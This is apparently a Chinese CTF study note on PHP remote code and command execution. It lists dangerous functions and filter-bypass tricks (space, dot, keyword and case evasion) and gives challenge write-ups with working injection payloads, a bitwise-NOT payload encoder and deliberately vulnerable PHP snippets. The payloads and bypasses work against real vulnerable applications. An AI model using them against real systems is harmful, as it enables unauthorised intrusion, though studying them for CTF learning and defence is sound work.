## 代码执行
指运行**编程语言编写的源代码或字节码**（如 Python、Java、C 等语言的代码），这些代码需要通过编译器、解释器或虚拟机转换成机器码后才能被 CPU 执行。
例如：运行 `python app.py` 执行 Python 代码，或通过 `java Main` 运行 Java 字节码，都属于代码执行。
## 命令执行
指运行**系统命令或脚本**（如操作系统自带的工具、shell 命令等），这些命令通常是操作系统预定义的可执行程序或脚本文件（如 Linux 中的 `ls`、`cd`、`rm`，Windows 中的 `dir`、`del` 等）。
例如：在终端输入 `ls -l` 列出文件，或执行 `./script.sh` 运行一个 shell 脚本，都属于命令执行。
## 区别
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$dir=$_POST['dir'];
system($dir);
?>
```
会将以Post方式传入的dir参数当成命令执行
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$dir=$_POST['dir'];
eval($dir);
?>
```
会将以Post方式传入的dir参数当成代码执行
## RCE常用函数
#### 代码执行
- `eval()`：执行字符串作为 PHP 代码（需字符串符合 PHP 语法，末尾加分号）。示例：`eval($_GET['code']);` 若传入 `?code=phpinfo();`，则执行 `phpinfo()`。回显
- `assert()`：判断字符串是否为合法 PHP 表达式，若为真则执行（PHP 7.2 后废弃作为执行函数）。示例：`assert($_POST['payload']);` 传入 `system('whoami')` 可执行系统命令。不回显
- `preg_replace()`（配合 `/e` 修饰符）：对匹配结果执行代码（PHP 7.0 后废弃 `/e` 修饰符）。示例`preg_replace('/test/e', $_GET['code'], 'test');` 传入 `?code=phpinfo();` 会执行。会将test替换为传的get参数
- `creat_function()`  `create_function(string $args, string $code);`
**`$args`**：函数的参数列表（字符串形式，如 `'$a, $b'`）。
**`$code`**：函数体代码（字符串形式，如 `'return $a + $b;'`）。
- `call_user_func()`:
 危险用法：直接将用户输入作为 callback
`$user_input = $_GET['func'];`
`call_user_func($user_input, '参数');`
若攻击者传入 `?func=system`，则会调用 `system('参数')` 执行系统命令；若传入 `?func=phpinfo();`，则会执行 `phpinfo()` 泄露服务器信息。可以回显
## 命令执行
- `system()`：执行系统命令，并输出结果。回显
- `exec()`：执行系统命令，返回最后一行结果（需用输出参数获取完整结果）。试了一下，不回显
- `shell_exec()`：执行系统命令，返回全部结果（字符串形式）。不回显
- `` `命令` ``（反引号）：与 `shell_exec()` 功能相同，例如  
```php
echo `whoami`;
```
这是回显的
- `passthru()`：执行系统命令，直接输出原始结果（适合二进制数据）。回显
- `pcntl_exec()`：执行指定程序（需 `pcntl` 扩展，直接替换当前进程）。不回显
- `popen`,例如`popen('ls -l', 'r');`执行ls-l,并且`r`读：从子进程接收输出，不回显
- `proc_open`  
```php
resource proc_open(
    string $command,
    array $descriptorspec,
    array &$pipes,
    string $cwd = null,
    array $env = null,
    array $other_options = null
);
```
其中`$command`表示要执行的命令
## 绕过姿势
#### 空格绕过
<  , <>, +,%20,%09，`$IFS$9`,`${IFS}`,`$IFS`,`$IFS$1`,`%0a` `%a0`可以替换空格，PHP 中用 `.` 连接字符串，可替代空格分隔变量或函数参数。
#### 点绕过
`.`，**如果是文件的话**，可以使用绝对路径从而避免出现`.`
还可以用 `$PWD`（当前目录绝对路径）替代 `.`:原命令：`./script.sh` → 绕过：`$PWD/script.sh`（`$PWD` 等价于当前目录绝对路径）。
**在命令执行中**，在 shell 中，`.` 是 `source` 命令的别名，用于在当前 shell 中执行脚本（如 `. ./env.sh` 加载环境变量），若 `.` 被过滤，可替换为 `source`：

原命令：`./env.sh` → 绕过：`source ./env.sh`（若 `source` 未被过滤）。
若路径中的 `.` 也被过滤：`source $PWD/env.sh`（结合 `$PWD` 替代当前目录）。
**代码注入中**：在 PHP 中，`.` 是字符串连接符（如 `"a"."b"` 拼接为 `"ab"`），若被过滤，可通过以下方式拼接字符串：  
```php
$a="fl";
$b="ag";
$str=$a$b;
```
还可以对`.`url加密为`%2E`  ，十六进制`\x2E` Unicode `\u002E`  
有些web服务器会对将文件的最后一个点后的扩展名解析，但可以加多个点，如：原文件名：`shell.php` → 绕过：`shell.php.xxx`（若 `.xxx` 不被拦截，且服务器仍解析为 PHP）。
#### 关键字符替换为空绕过方法
如果网页会将`flag` `cat` `ls` 或者其他重要字符替换为空，可以先观察是否使用循环语句，如果没有，则说明只替换一次，可以将关键词嵌套，如写成`flflagag`,删除掉一个flag,正好拼接成一个flag，或者加一个转义字符`fl\ag`
#### 大小写绕过法
如果题目只是黑名单了一个语法词汇的小写形式，可以将某些字母改为大写绕过，如:system改为System
## 某些语法被过滤怎么办
如cat被过滤可以用替代函数，如less/more/head/tail/nl/od/grep/printf/vi/ vim/ nano/tac等
ls被过滤可以用ll,tree,vdir,lsd,exa，tac替代
## 题目
```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
	$c = $_GET['c'];
	if(!preg_match("/system| | \.|cat/i",$c)){//过滤掉了system,空格，点，cat
		eval($c);
	}
}else{
	highlight_file(__FILE__);
}
?>
```
首先想到system被过滤了，可以换其他命令执行函数，如`passthru()`,也可以回显，与system用法基本相同，或者用反引号，空格可以用以上方法绕过，cat也有替代指令，如more,less,但我是windows系统，上述linux,代码都没成功
## WriteUp
#### babyrce
先发送cookie请求，用hackbar将cookie的vaule改为admin=1,发送得到一个文件`rasalghul.php`访问他，发送get请求`?url=ls${IFS}/`用`${IFS}`代替空格，看到一个`flllllaaaaaaggggggg`,再发送`?url=cat${IFS}/flllllaaaaaaggggggg`得到flag
## hardrce
禁止所有字母和大部分符号，可以用~取反(没禁)，可以不用字母，可以用脚本将`system` 和`ls /`分别转换url编码取反  
```python
def force_url_encode(s):  
    """强制对所有字符进行URL编码（%XX形式，大写十六进制）"""  
    return ''.join([f'%{format(ord(c), "02X")}' for c in s])  
  
  
def url_decode(encoded_str):  
    """将%XX格式的URL编码字符串解码为原始字符"""  
    decoded = []  
    i = 0  
    while i < len(encoded_str):  
        if encoded_str[i] == '%' and i + 2 < len(encoded_str):  
            hex_str = encoded_str[i + 1:i + 3]  
            decoded_char = chr(int(hex_str, 16))  
            decoded.append(decoded_char)  
            i += 3  
        else:  
            decoded.append(encoded_str[i])  
            i += 1  
    return ''.join(decoded)  
  
  
def bitwise_not(s):  
    """对字符串中每个字符执行按位取反（~）"""  
    return ''.join([chr(~ord(c) & 0xFF) for c in s])  
  
  
# 主程序：接收用户输入并处理  
if __name__ == "__main__":  
    # 获取用户输入  
    user_input = input("请输入需要处理的字符串：")  
  
    # 步骤1：强制URL编码  
    encoded = force_url_encode(user_input)  
    print(f"\n1. 强制URL编码结果：{encoded}")  
  
    # 步骤2：将编码结果解析为字符（用于取反）  
    decoded_encoded = url_decode(encoded)  
  
    # 步骤3：对解析后的字符执行按位取反  
    not_result = bitwise_not(decoded_encoded)  
    # 取反结果可能包含不可见字符，同时显示其URL编码便于查看  
    not_result_encoded = force_url_encode(not_result)  
    print(f"2. 按位取反（~）后的字符（URL编码形式）：{not_result_encoded}")  
  
    # 反向验证：对取反结果再取反，应回到原始字符串  
    reversed_not = bitwise_not(not_result)  
    print(f"3. 对取反结果再次取反，验证是否还原：{reversed_not}")
```
## finalrce
这题难点在`exec`是命令执行函数但执行结果不回显，可以用一些其他方法，如`ls > 1.txt`可以将当前目录下的文件名放到1.txt里，但ls和>都被禁了，ls可以用转义符`l\s`，>可以用tee代替,  
tee命令:linux中用于读取标准输入的数据，并将其内容输出成文件，与>作用差不多  
`|`管道符表示将上一个命令的输出传递给下一个命令作为输入  
所以可以用`?url=l\s / | tee 1.txt`根目录的内容都存到1.txt里了，访问文件，输出文件列表，flag可能在`flllllaaaaaaggggggg`里，再用刚才的方法,`?url=grep C /flllll?aaaaaggggggg | tee 1.txt` cat被禁了可以用grep,又因为`la`被禁了，通配符`*`被禁了,但可以用?匹配单个字符，然后访问1.txt，得到flag，因为flag形式为NSSCTF{}，所以搜索C
## RCE-PLUS
与finalrce十分相似，但是这个更简单，因为>没被禁，flag用\转义符绕过就行
## command_execution
可以利用管道符执行命令，输入`127.0.0.1|ls /`没找到flag,可以用`127.0.0.1|find / -name "*flag*`找到一个文件`/home/flag.txt`输出他`127.0.0.1|cat /home/flag.txt`得到flag,（这个题目貌似出问题了，flag提交显示不正确）




